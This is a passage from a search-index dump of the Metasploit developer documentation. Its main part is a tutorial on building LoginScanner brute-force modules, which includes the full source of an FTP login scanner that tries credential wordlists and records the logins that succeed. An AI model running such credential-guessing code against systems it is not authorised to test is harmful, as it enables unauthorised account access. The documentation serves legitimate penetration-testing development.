'user=jsmith&pass=hello123' # You should use the 'vars_post' key instead of 'data', # unless you're trying to avoid the API escaping your # parameter names send_request_cgi ({ 'method' => 'POST' , 'uri' => '/' , 'data' => data_post }) 9. Bad variable naming style # What's this, Java? # The proper naming style in this case should be: my_string myString = \"hello, world\" 10. Using global variables # $msg is a global variable that can be accessed anywhere within the program. # This can induce bugs to other modules or mixins that are hard to debug. # Use @instance variables instead. # This is also mentioned in your HACKING file :-) class Opinion def initialize # This variable shouldn't be shared with other classes $msg = \"It's called the Freedom of Information Act. The Hippies finally got something right.\" end end class Metasploit3 def initialize puts $msg end end Opinion . new Metasploit3 . new 11. Modifying the datastore during execution # https://github.com/rapid7/metasploit-framework/issues/3853 datastore [ 'BAD' ] = 'This is bad.'","title":"Bad Examples You Should NOT Follow:"},{"location":"dev/dark/Contact/","text":"Chat A lot of our discussion happens on IRC in #metasploit on Freenode. Please be patient and hang around for a while -- not everyone is awake at the same time as you. =) Mailing list The Metasploit development mailing list used to be hosted on SourceForge, but is now on Google Groups. Metasploit Hackers is dead, long live Metasploit Hackers . (Or mailto:Metasploit Hackers ). The old list is archived on seclists.org . Abuse Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to msfdev@metasploit.com which goes to all the current committers. If the incident involves a committer, you may report directly to caitlin_condon@rapid7.com or todb@metasploit.com .","title":"Contact"},{"location":"dev/dark/Contact/#chat","text":"A lot of our discussion happens on IRC in #metasploit on Freenode. Please be patient and hang around for a while -- not everyone is awake at the same time as you. =)","title":"Chat"},{"location":"dev/dark/Contact/#mailing-list","text":"The Metasploit development mailing list used to be hosted on SourceForge, but is now on Google Groups. Metasploit Hackers is dead, long live Metasploit Hackers . (Or mailto:Metasploit Hackers ). The old list is archived on seclists.org .","title":"Mailing list"},{"location":"dev/dark/Contact/#abuse","text":"Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to msfdev@metasploit.com which goes to all the current committers. If the incident involves a committer, you may report directly to caitlin_condon@rapid7.com or todb@metasploit.com .","title":"Abuse"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/","text":"So, you want to make a Login Scanner Module in Metasploit, eh? There are a few things you will need to know before you begin. This article will try to illustrate all the moving pieces involved in creating an effective bruteforce/login scanner module. Credential objects Result objects CredentialCollection LoginScanner Base Attributes Methods Constants Pulling it all Together in a module The Cred Collection Initialising the Scanner The scan block ftp_login final view Credential Objects Metasploit::Framework::Credential (lib/metasploit/framework/credential.rb) These objects represent the most basic concept of how we now think about Credentials. Public: The public part of a credential refers to the part that can be publicly known. In almost all cases this is the username. Private: The private part of the credential, this is the part that should be a secret. This currently represents: Password, SSH Key, NTLM Hash etc. Private Type: This defines what type of private credential is defined above Realm: This represents an authentication realm that the credential is valid for. This is a teritary part of the authentication process. Examples include: Active Directory Domain, Postgres Database etc. Realm Key: This defines what type of Realm the Realm Attribute represents Paired: This attribute is a boolean value that sets whether the Credential must have both a public and private to be valid All LoginScanners use Credential objects as the basis for their attempts. Result Objects Metasploit::Framework::LoginScanner::Result (lib/metasploit/framework/login_scanner/result.rb) These are the objects yielded by the scan! method on each LoginScanner. They contain: Access Level: an optional Access Level which can describe the level of access granted by the login attempt. Credential : the Credential object that achieved that result Proof: an optional proof string to show why we think the result is valid Status: The status of the login attempt. These values come from Metasploit::model::Login::Status , examples include \"Incorrect\", \"Unable to Connect\", \"Untried\" etc CredentialCollection Metasploit::Framework::CredentialCollection (lib/metasploit/framework/credential_collection.rb) This class is used to take datastore options from a module and yield Credential objects from an each method. It takes wordlist files, as well as direct username and password options. It also takes options for username as pass and blank apssword. It can be passed in as the cred_details on the LoginScanner, and responds to #each and yields crafted Credentials. Example (from modules/auxiliary/scanner/ftp/ftp_login.rb): cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds ) LoginScanner Base Metasploit::Framework::LoginScanner::Base (lib/metasploit/framework/login_scanner/base.rb) This is a Ruby Module that contains all the base behaviour for all LoginScanners. All LoginScanner classes should include this module. The specs for this behaviour are kept in a shared example group. Specs for your LoginScanner should use the following syntax to include these tests: it_behaves_like 'Metasploit::Framework::LoginScanner::Base' , has_realm_key : false , has_default_realm : false Where has_realm_key and has_default_realm should be set according to whether your LoginScanner has those things. (More on this later) LoginScanners always take a collection of Crednetials to try and one host and port. so each LoginScanner object attempts to login to only one specific service. Attributes connection_timeout: The time to wait for a connection to timeout cred_details: An object that yeilds credentials on each (like credentialCollection or an Array) host: The address for the target host port: the port number for the target service proxies: any proxies to use in the connection (some scanners might not support this) stop_on_success: whether to stop trying after a successful login is found Methods each_credential : You will not have to worry much about this method, Be aware that it is there. It iterates through whatever is in cred_details, does some normalization and tries to make sure each Credential is properly setup for use by the given LoginScanner. It yields each Credential in a block. ```ruby def each_credential cred_details.each do |raw_cred| # This could be a Credential object, or a Credential Core, or an Attempt object # so make sure that whatever it is, we end up with a Credential. credential = raw_cred.to_credential if credential.realm.present? && self.class::REALM_KEY.present? credential.realm_key = self.class::REALM_KEY yield credential elsif credential.realm.blank? && self.class::REALM_KEY.present? && self.class::DEFAULT_REALM.present? credential.realm_key = self.class::REALM_KEY credential.realm = self.class::DEFAULT_REALM yield credential elsif credential.realm.present? && self.class::REALM_KEY.blank? second_cred = credential.dup # Strip the realm off here, as we don't want it credential.realm = nil credential.realm_key = nil yield credential # Some services can take a domain in the username like this even though # they do not explicitly take a domain as part of the protocol. second_cred.public = \"#{second_cred.realm}\\\\#{second_cred.public}\" second_cred.realm = nil second_cred.realm_key = nil yield second_cred else yield credential end end end ``` set_sane_defaults: This method will be overridden by each specific Loginscanner. This is called at the end of the initializer and sets any sane defaults for attributes that have them and were not given a specific value in the initializer. # This is a placeholder method. Each LoginScanner class # will override this with any sane defaults specific to # its own behaviour. # @abstract # @return [void] def set_sane_defaults self . connection_timeout = 30 if self . connection_timeout . nil? end attempt_login: This method is just a stub on the Base mixin. It will be ovverriden in each LoginScanner class to contain the logic to take one single Credential object and use it to make a login attempt against the target service. It returns a ::Metasploit::Framework::LoginScanner::Result object containing all the information about that attempt's result. For an example let's look at the attempt_login method from Metasploit::Framework::LoginScanner::FTP (lib/metasploit/framework/login_scanner/ftp.rb) # (see Base#attempt_login) def attempt_login ( credential ) result_options = { credential : credential } begin success = connect_login ( credential . public , credential . private ) rescue :: EOFError , Rex :: AddressInUse , Rex :: ConnectionError , Rex :: ConnectionTimeout , :: Timeout :: Error result_options [ :status ] = Metasploit :: Model :: Login :: Status :: UNABLE_TO_CONNECT success = false end if success result_options [ :status ] = Metasploit :: Model :: Login :: Status :: SUCCESSFUL elsif ! ( result_options . has_key? :status ) result_options [ :status ] = Metasploit :: Model :: Login :: Status :: INCORRECT end :: Metasploit :: Framework :: LoginScanner :: Result . new ( result_options ) end scan! : This method is the main one you will be concerned with. This method does several things. It calls valid! which will check all of the validations on the class and raise an Metasploit::Framework::LoginScanner::Invalid if any of the Vlidations fail. This exception will contain all the errors messages for any failing validations. it keeps track of the connection error count, and will bail out if we have too many connection errors or too many in a row it runs throguh all of the credentials by calling each_credential with a block in that block it passes each credential to #attempt_login it yields the Result object into the block it is passed if stop_on_success is set it will also exit out early if it the reuslt was a success # Attempt to login with every {Credential credential} in # {#cred_details}, by calling {#attempt_login} once for each. # # If a successful login is found for a user, no more attempts # will be made for that user. # # @yieldparam result [Result] The {Result} object for each attempt # @yieldreturn [void] # @return [void] def scan! valid! # Keep track of connection errors. # If we encounter too many, we will stop. consecutive_error_count = 0 total_error_count = 0 successful_users = Set . new each_credential do | credential | next if successful_users . include? ( credential . public ) result = attempt_login ( credential ) result . freeze yield result if block_given? if result . success? consecutive_error_count = 0 break if stop_on_success successful_users << credential . public else if result . status == Metasploit :: Model :: Login :: Status :: UNABLE_TO_CONNECT consecutive_error_count += 1 total_error_count += 1 break if consecutive_error_count >= 3 break if total_error_count >= 10 end end end nil end Constants Although not defined on Base, each LoginScanner has a series of Constants that can be defined on it to assist with critical behaviour. DEFAULT_PORT: DEFAULT_PORT is a simple constant for use with set_sane_defaults. If the port isn't set by the user it will use DEFAULT_PORT. This is put in a constant so it can be quickly referenced from outside the scanner. These next two Constants are used by the LoginScanner namespace method classes_for_services. This method invoked by Metasploit::Framework::LoginScanner.classes_for_service(<Mdm::service>) will actually return an array of LoginScanner classes that may be useful to try against that particular Service. - LIKELY_PORTS : This constant holds n array of port numbers that it would be likely useful to use this scanner against. - LIKELY_SERVICE_NAMES : like above except with strings for service names instead of port numbers. PRIVATE_TYPES : This contains an array of symbols representing the different Private credential types it supports. It should always match the demodulize result for the Private class i.e :password, :ntlm_hash, :ssh_key These constants are fore LoginScanners that have to deal with Realms such as AD domains or Database Names. REALM_KEY: The type of Realm this scanner expects to deal with. Should always be a constants from metasploit::Model::Login::Status DEFAULT_REALM: Some scanners have a default realm (like WORKSTATION for AD domain stuff). If a credential is given to a scanner that requires a realm, but the credential has no realm, this value will be added to the credential as the realm. CAN_GET_SESSION: this should be either true or false as to whether we expect we could somehow get a session with a Credential found from this scanner. example1 ( Metasploit::Framework::LoginScanner::FTP) DEFAULT_PORT = 21 LIKELY_PORTS = [ DEFAULT_PORT , 2121 ] LIKELY_SERVICE_NAMES = [ 'ftp' ] PRIVATE_TYPES = [ :password ] REALM_KEY = nil example2 ( Metasploit::Framework::LoginScanner::SMB) CAN_GET_SESSION = true DEFAULT_REALM = 'WORKSTATION' LIKELY_PORTS = [ 139 , 445 ] LIKELY_SERVICE_NAMES = [ \"smb\" ] PRIVATE_TYPES = [ :password , :ntlm_hash ] REALM_KEY = Metasploit :: Model :: Realm :: Key :: ACTIVE_DIRECTORY_DOMAIN Pulling it all Together in a module So now you hopefully have a good diea of all the moving peices involved in creating a LoginScanner. The next step is using your brand new LoginScanner in an actual module. Let's look at the ftp_login module: def run_host(ip) Every Bruteforce/Login module should be a scanner and should use the run_host method which will run once for each RHOST. The Cred Collection cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds ) So here we see the CredentialCollection getting created using the datastore options. We pass in the options for Cred creation such as wordlists, raw usernames and passwords, whether to try the username as a password, and whether to try blank passwords. you'll also notice an option here called prepended_creds. FTP is one of the only module to make use of this, but it is generally available through the CredentialCollection. This option is an array of Metasploit::Framework::Credential objects that should be spit back by the collection before any others. FTP uses this to deal with testing for anon FTP access. Initialising the Scanner scanner = Metasploit :: Framework :: LoginScanner :: FTP . new ( host : ip , port : rport , proxies : datastore [ 'PROXIES' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , connection_timeout : 30 ) Here we actually create our Scanner object. We set the IP and Port based on data the module already knows about. We can pull any user supplied proxy data from the datatstore. we also pull from the datastore whether to stop on a success for this service. the cred details object is populated by our Credentialcollection which will handle all the credential generation for us invisibly. This gives us our scanner object, all configured and ready to go. The scan block scanner . scan! do | result | credential_data = result . to_h credential_data . merge! ( module_fullname : self . fullname , workspace_id : myworkspace_id ) if result . success? credential_core = create_credential ( credential_data ) credential_data [ :core ] = credential_core create_credential_login ( credential_data ) print_good \" #{ ip } : #{ rport } - LOGIN SUCCESSFUL: #{ result . credential } \" else invalidate_login ( credential_data ) print_status \" #{ ip } : #{ rport } - LOGIN FAILED: #{ result . credential } ( #{ result . status } : #{ result . proof } )\" end end This is the real heart of the matter here. We call scan! on our scanner, and pass it a block. As we mentioned before, the scanner yields each attempt's Result object into that block. We check the result's status to see if it was successful or not. The result object now as a .to_h method which returns a hash compatible with our credential creation methods. We take that hash and merge in our module specific information and workspace id. In the case of a success we build some info hashes and call create_credential. This is a method found in the metasploit-credential gem under lib/metasploit/credential/creation.rb in a mixin called Metasploit::Credential::Creation. This mixin is included in the Report mixin, so if your module includes that mixin you'll get these methods for free. create_credential creates a Metasploit::Credential::Core. We then take that core, the service data, and merge it with some additional data. This additional data includes the access level, the current time (to update last_attempted_at on the Metasploit::Credential::Login), the the status. Finally, for a success, we output the result to the console. In the case of a failure, we call the invalidate_login method. This method also comes from the Creation mixin. This method looks to see if a Login object already exists for this credential:service pair. If it does, it updates the status to the status we got back from the scanner. This is primarily to account for Login objects created by things like Post modules that have an untried status. ftp_login final view Pulling it all together, we get a new ftp_login module that looks something like this: ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/credential_collection' require 'metasploit/framework/login_scanner/ftp' class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Ftp include Msf :: Auxiliary :: Scanner include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: AuthBrute def proto 'ftp' end def initialize super ( 'Name' => 'FTP Authentication Scanner' , 'Description' => %q{ This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. } , 'Author' => 'todb' , 'References' => [ [ 'CVE' , '1999-0502' ] # Weak password ] , 'License' => MSF_LICENSE ) register_options ( [ Opt :: RPORT ( 21 ), OptBool . new ( 'RECORD_GUEST' , [ false , \"Record anonymous/guest logins to the database\" , false ] ) ] , self . class ) register_advanced_options ( [ OptBool . new ( 'SINGLE_SESSION' , [ false , 'Disconnect after every login attempt' , false ] ) ] ) deregister_options ( 'FTPUSER' , 'FTPPASS' ) # Can use these, but should use 'username' and 'password' @accepts_all_logins = {} end def run_host ( ip ) print_status ( \" #{ ip } : #{ rport } - Starting FTP login sweep\" ) cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds ) scanner = Metasploit :: Framework :: LoginScanner :: FTP . new ( host : ip , port : rport , proxies : datastore [ 'PROXIES' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , connection_timeout : 30 ) scanner . scan! do | result | credential_data = result . to_h credential_data . merge! ( module_fullname : self . fullname , workspace_id : myworkspace_id ) if result . success? credential_core = create_credential ( credential_data ) credential_data [ :core ] = credential_core create_credential_login ( credential_data ) print_good \" #{ ip } : #{ rport } - LOGIN SUCCESSFUL: #{ result . credential } \" else invalidate_login ( credential_data ) print_status \" #{ ip } : #{ rport } - LOGIN FAILED: #{ result . credential } ( #{ result . status } : #{ result . proof } )\" end end end # Always check for anonymous access by pretending to be a browser. def anonymous_creds anon_creds = [ ] if datastore [ 'RECORD_GUEST' ] [ 'IEUser@' , 'User@' , 'mozilla@example.com' , 'chrome@example.com' ]. each do | password | anon_creds << Metasploit :: Framework :: Credential . new ( public : 'anonymous' , private : password ) end end anon_creds end def test_ftp_access ( user , scanner ) dir = Rex :: Text . rand_text_alpha ( 8 ) write_check = scanner . send_cmd ( [ 'MKD' , dir ] , true ) if write_check and write_check =~ /^2/ scanner . send_cmd ( [ 'RMD' , dir ] , true ) print_status ( \" #{ rhost } : #{ rport } - User ' #{ user } ' has READ/WRITE access\" ) return 'Read/Write' else print_status ( \" #{ rhost } : #{ rport } - User ' #{ user } ' has READ access\" ) return 'Read-only' end end end","title":"Creating Metasploit Framework LoginScanners"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#credential-objects","text":"Metasploit::Framework::Credential (lib/metasploit/framework/credential.rb) These objects represent the most basic concept of how we now think about Credentials. Public: The public part of a credential refers to the part that can be publicly known. In almost all cases this is the username. Private: The private part of the credential, this is the part that should be a secret. This currently represents: Password, SSH Key, NTLM Hash etc. Private Type: This defines what type of private credential is defined above Realm: This represents an authentication realm that the credential is valid for. This is a teritary part of the authentication process. Examples include: Active Directory Domain, Postgres Database etc. Realm Key: This defines what type of Realm the Realm Attribute represents Paired: This attribute is a boolean value that sets whether the Credential must have both a public and private to be valid All LoginScanners use Credential objects as the basis for their attempts.","title":"Credential Objects"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#result-objects","text":"Metasploit::Framework::LoginScanner::Result (lib/metasploit/framework/login_scanner/result.rb) These are the objects yielded by the scan! method on each LoginScanner. They contain: Access Level: an optional Access Level which can describe the level of access granted by the login attempt. Credential : the Credential object that achieved that result Proof: an optional proof string to show why we think the result is valid Status: The status of the login attempt. These values come from Metasploit::model::Login::Status , examples include \"Incorrect\", \"Unable to Connect\", \"Untried\" etc","title":"Result Objects"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#credentialcollection","text":"Metasploit::Framework::CredentialCollection (lib/metasploit/framework/credential_collection.rb) This class is used to take datastore options from a module and yield Credential objects from an each method. It takes wordlist files, as well as direct username and password options. It also takes options for username as pass and blank apssword. It can be passed in as the cred_details on the LoginScanner, and responds to #each and yields crafted Credentials. Example (from modules/auxiliary/scanner/ftp/ftp_login.rb): cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds )","title":"CredentialCollection"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#loginscanner-base","text":"Metasploit::Framework::LoginScanner::Base (lib/metasploit/framework/login_scanner/base.rb) This is a Ruby Module that contains all the base behaviour for all LoginScanners. All LoginScanner classes should include this module. The specs for this behaviour are kept in a shared example group. Specs for your LoginScanner should use the following syntax to include these tests: it_behaves_like 'Metasploit::Framework::LoginScanner::Base' , has_realm_key : false , has_default_realm : false Where has_realm_key and has_default_realm should be set according to whether your LoginScanner has those things. (More on this later) LoginScanners always take a collection of Crednetials to try and one host and port. so each LoginScanner object attempts to login to only one specific service.","title":"LoginScanner Base"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#attributes","text":"connection_timeout: The time to wait for a connection to timeout cred_details: An object that yeilds credentials on each (like credentialCollection or an Array) host: The address for the target host port: the port number for the target service proxies: any proxies to use in the connection (some scanners might not support this) stop_on_success: whether to stop trying after a successful login is found","title":"Attributes"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#methods","text":"each_credential : You will not have to worry much about this method, Be aware that it is there. It iterates through whatever is in cred_details, does some normalization and tries to make sure each Credential is properly setup for use by the given LoginScanner. It yields each Credential in a block. ```ruby def each_credential cred_details.each do |raw_cred| # This could be a Credential object, or a Credential Core, or an Attempt object # so make sure that whatever it is, we end up with a Credential. credential = raw_cred.to_credential if credential.realm.present? && self.class::REALM_KEY.present? credential.realm_key = self.class::REALM_KEY yield credential elsif credential.realm.blank? && self.class::REALM_KEY.present? && self.class::DEFAULT_REALM.present? credential.realm_key = self.class::REALM_KEY credential.realm = self.class::DEFAULT_REALM yield credential elsif credential.realm.present? && self.class::REALM_KEY.blank? second_cred = credential.dup # Strip the realm off here, as we don't want it credential.realm = nil credential.realm_key = nil yield credential # Some services can take a domain in the username like this even though # they do not explicitly take a domain as part of the protocol. second_cred.public = \"#{second_cred.realm}\\\\#{second_cred.public}\" second_cred.realm = nil second_cred.realm_key = nil yield second_cred else yield credential end end end ``` set_sane_defaults: This method will be overridden by each specific Loginscanner. This is called at the end of the initializer and sets any sane defaults for attributes that have them and were not given a specific value in the initializer. # This is a placeholder method. Each LoginScanner class # will override this with any sane defaults specific to # its own behaviour. # @abstract # @return [void] def set_sane_defaults self . connection_timeout = 30 if self . connection_timeout . nil? end attempt_login: This method is just a stub on the Base mixin. It will be ovverriden in each LoginScanner class to contain the logic to take one single Credential object and use it to make a login attempt against the target service. It returns a ::Metasploit::Framework::LoginScanner::Result object containing all the information about that attempt's result. For an example let's look at the attempt_login method from Metasploit::Framework::LoginScanner::FTP (lib/metasploit/framework/login_scanner/ftp.rb) # (see Base#attempt_login) def attempt_login ( credential ) result_options = { credential : credential } begin success = connect_login ( credential . public , credential . private ) rescue :: EOFError , Rex :: AddressInUse , Rex :: ConnectionError , Rex :: ConnectionTimeout , :: Timeout :: Error result_options [ :status ] = Metasploit :: Model :: Login :: Status :: UNABLE_TO_CONNECT success = false end if success result_options [ :status ] = Metasploit :: Model :: Login :: Status :: SUCCESSFUL elsif ! ( result_options . has_key? :status ) result_options [ :status ] = Metasploit :: Model :: Login :: Status :: INCORRECT end :: Metasploit :: Framework :: LoginScanner :: Result . new ( result_options ) end scan! : This method is the main one you will be concerned with. This method does several things. It calls valid! which will check all of the validations on the class and raise an Metasploit::Framework::LoginScanner::Invalid if any of the Vlidations fail. This exception will contain all the errors messages for any failing validations. it keeps track of the connection error count, and will bail out if we have too many connection errors or too many in a row it runs throguh all of the credentials by calling each_credential with a block in that block it passes each credential to #attempt_login it yields the Result object into the block it is passed if stop_on_success is set it will also exit out early if it the reuslt was a success # Attempt to login with every {Credential credential} in # {#cred_details}, by calling {#attempt_login} once for each. # # If a successful login is found for a user, no more attempts # will be made for that user. # # @yieldparam result [Result] The {Result} object for each attempt # @yieldreturn [void] # @return [void] def scan! valid! # Keep track of connection errors. # If we encounter too many, we will stop. consecutive_error_count = 0 total_error_count = 0 successful_users = Set . new each_credential do | credential | next if successful_users . include? ( credential . public ) result = attempt_login ( credential ) result . freeze yield result if block_given? if result . success? consecutive_error_count = 0 break if stop_on_success successful_users << credential . public else if result . status == Metasploit :: Model :: Login :: Status :: UNABLE_TO_CONNECT consecutive_error_count += 1 total_error_count += 1 break if consecutive_error_count >= 3 break if total_error_count >= 10 end end end nil end","title":"Methods"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#constants","text":"Although not defined on Base, each LoginScanner has a series of Constants that can be defined on it to assist with critical behaviour. DEFAULT_PORT: DEFAULT_PORT is a simple constant for use with set_sane_defaults. If the port isn't set by the user it will use DEFAULT_PORT. This is put in a constant so it can be quickly referenced from outside the scanner. These next two Constants are used by the LoginScanner namespace method classes_for_services. This method invoked by Metasploit::Framework::LoginScanner.classes_for_service(<Mdm::service>) will actually return an array of LoginScanner classes that may be useful to try against that particular Service. - LIKELY_PORTS : This constant holds n array of port numbers that it would be likely useful to use this scanner against. - LIKELY_SERVICE_NAMES : like above except with strings for service names instead of port numbers. PRIVATE_TYPES : This contains an array of symbols representing the different Private credential types it supports. It should always match the demodulize result for the Private class i.e :password, :ntlm_hash, :ssh_key These constants are fore LoginScanners that have to deal with Realms such as AD domains or Database Names. REALM_KEY: The type of Realm this scanner expects to deal with. Should always be a constants from metasploit::Model::Login::Status DEFAULT_REALM: Some scanners have a default realm (like WORKSTATION for AD domain stuff). If a credential is given to a scanner that requires a realm, but the credential has no realm, this value will be added to the credential as the realm. CAN_GET_SESSION: this should be either true or false as to whether we expect we could somehow get a session with a Credential found from this scanner. example1 ( Metasploit::Framework::LoginScanner::FTP) DEFAULT_PORT = 21 LIKELY_PORTS = [ DEFAULT_PORT , 2121 ] LIKELY_SERVICE_NAMES = [ 'ftp' ] PRIVATE_TYPES = [ :password ] REALM_KEY = nil example2 ( Metasploit::Framework::LoginScanner::SMB) CAN_GET_SESSION = true DEFAULT_REALM = 'WORKSTATION' LIKELY_PORTS = [ 139 , 445 ] LIKELY_SERVICE_NAMES = [ \"smb\" ] PRIVATE_TYPES = [ :password , :ntlm_hash ] REALM_KEY = Metasploit :: Model :: Realm :: Key :: ACTIVE_DIRECTORY_DOMAIN","title":"Constants"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#pulling-it-all-together-in-a-module","text":"So now you hopefully have a good diea of all the moving peices involved in creating a LoginScanner. The next step is using your brand new LoginScanner in an actual module. Let's look at the ftp_login module: def run_host(ip) Every Bruteforce/Login module should be a scanner and should use the run_host method which will run once for each RHOST.","title":"Pulling it all Together in a module"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#the-cred-collection","text":"cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds ) So here we see the CredentialCollection getting created using the datastore options. We pass in the options for Cred creation such as wordlists, raw usernames and passwords, whether to try the username as a password, and whether to try blank passwords. you'll also notice an option here called prepended_creds. FTP is one of the only module to make use of this, but it is generally available through the CredentialCollection. This option is an array of Metasploit::Framework::Credential objects that should be spit back by the collection before any others. FTP uses this to deal with testing for anon FTP access.","title":"The Cred Collection"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#initialising-the-scanner","text":"scanner = Metasploit :: Framework :: LoginScanner :: FTP . new ( host : ip , port : rport , proxies : datastore [ 'PROXIES' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , connection_timeout : 30 ) Here we actually create our Scanner object. We set the IP and Port based on data the module already knows about. We can pull any user supplied proxy data from the datatstore. we also pull from the datastore whether to stop on a success for this service. the cred details object is populated by our Credentialcollection which will handle all the credential generation for us invisibly. This gives us our scanner object, all configured and ready to go.","title":"Initialising the Scanner"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#the-scan-block","text":"scanner . scan! do | result | credential_data = result . to_h credential_data . merge! ( module_fullname : self . fullname , workspace_id : myworkspace_id ) if result . success? credential_core = create_credential ( credential_data ) credential_data [ :core ] = credential_core create_credential_login ( credential_data ) print_good \" #{ ip } : #{ rport } - LOGIN SUCCESSFUL: #{ result . credential } \" else invalidate_login ( credential_data ) print_status \" #{ ip } : #{ rport } - LOGIN FAILED: #{ result . credential } ( #{ result . status } : #{ result . proof } )\" end end This is the real heart of the matter here. We call scan! on our scanner, and pass it a block. As we mentioned before, the scanner yields each attempt's Result object into that block. We check the result's status to see if it was successful or not. The result object now as a .to_h method which returns a hash compatible with our credential creation methods. We take that hash and merge in our module specific information and workspace id. In the case of a success we build some info hashes and call create_credential. This is a method found in the metasploit-credential gem under lib/metasploit/credential/creation.rb in a mixin called Metasploit::Credential::Creation. This mixin is included in the Report mixin, so if your module includes that mixin you'll get these methods for free. create_credential creates a Metasploit::Credential::Core. We then take that core, the service data, and merge it with some additional data. This additional data includes the access level, the current time (to update last_attempted_at on the Metasploit::Credential::Login), the the status. Finally, for a success, we output the result to the console. In the case of a failure, we call the invalidate_login method. This method also comes from the Creation mixin. This method looks to see if a Login object already exists for this credential:service pair. If it does, it updates the status to the status we got back from the scanner. This is primarily to account for Login objects created by things like Post modules that have an untried status.","title":"The scan block"},{"location":"dev/dark/Creating-Metasploit-Framework-LoginScanners/#ftp_login-final-view","text":"Pulling it all together, we get a new ftp_login module that looks something like this: ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/credential_collection' require 'metasploit/framework/login_scanner/ftp' class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Ftp include Msf :: Auxiliary :: Scanner include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: AuthBrute def proto 'ftp' end def initialize super ( 'Name' => 'FTP Authentication Scanner' , 'Description' => %q{ This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. } , 'Author' => 'todb' , 'References' => [ [ 'CVE' , '1999-0502' ] # Weak password ] , 'License' => MSF_LICENSE ) register_options ( [ Opt :: RPORT ( 21 ), OptBool . new ( 'RECORD_GUEST' , [ false , \"Record anonymous/guest logins to the database\" , false ] ) ] , self . class ) register_advanced_options ( [ OptBool . new ( 'SINGLE_SESSION' , [ false , 'Disconnect after every login attempt' , false ] ) ] ) deregister_options ( 'FTPUSER' , 'FTPPASS' ) # Can use these, but should use 'username' and 'password' @accepts_all_logins = {} end def run_host ( ip ) print_status ( \" #{ ip } : #{ rport } - Starting FTP login sweep\" ) cred_collection = Metasploit :: Framework :: CredentialCollection . new ( blank_passwords : datastore [ 'BLANK_PASSWORDS' ] , pass_file : datastore [ 'PASS_FILE' ] , password : datastore [ 'PASSWORD' ] , user_file : datastore [ 'USER_FILE' ] , userpass_file : datastore [ 'USERPASS_FILE' ] , username : datastore [ 'USERNAME' ] , user_as_pass : datastore [ 'USER_AS_PASS' ] , prepended_creds : anonymous_creds ) scanner = Metasploit :: Framework :: LoginScanner :: FTP . new ( host : ip , port : rport , proxies : datastore [ 'PROXIES' ] , cred_details : cred_collection , stop_on_success : datastore [ 'STOP_ON_SUCCESS' ] , connection_timeout : 30 ) scanner . scan! do | result | credential_data = result . to_h credential_data . merge! ( module_fullname : self . fullname , workspace_id : myworkspace_id ) if result . success? credential_core = create_credential ( credential_data ) credential_data [ :core ] = credential_core create_credential_login ( credential_data ) print_good \" #{ ip } : #{ rport } - LOGIN SUCCESSFUL: #{ result . credential } \" else invalidate_login ( credential_data ) print_status \" #{ ip } : #{ rport } - LOGIN FAILED: 